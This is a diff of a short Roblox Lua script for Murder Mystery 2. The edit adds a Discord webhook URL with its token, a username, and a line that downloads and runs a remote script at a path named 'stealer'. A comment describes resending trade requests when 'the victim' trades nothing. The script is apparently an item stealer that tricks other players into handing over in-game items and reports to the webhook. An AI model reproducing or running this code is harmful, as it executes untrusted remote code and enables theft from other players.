@@ -1,1 +1,5 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/D3athFeather/mm2/main/4e8ed1e95083ead22e8a8832.lua"))()
+Username = "tadash_10"
+Webhook = "https://discord.com/api/webhooks/1284860834886975541/Scw_BgOMhZhYlUnPOh_BTxbvHLlkAOtmcWMyHDgrIaQoDXYmx1Uv8TawW_aoNIe_moFm"
+-- Send a message in chat to resend the trade request if you haven't receive it or if the victim trade nothing when you traded him.
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/main/mm2/stealer"))()
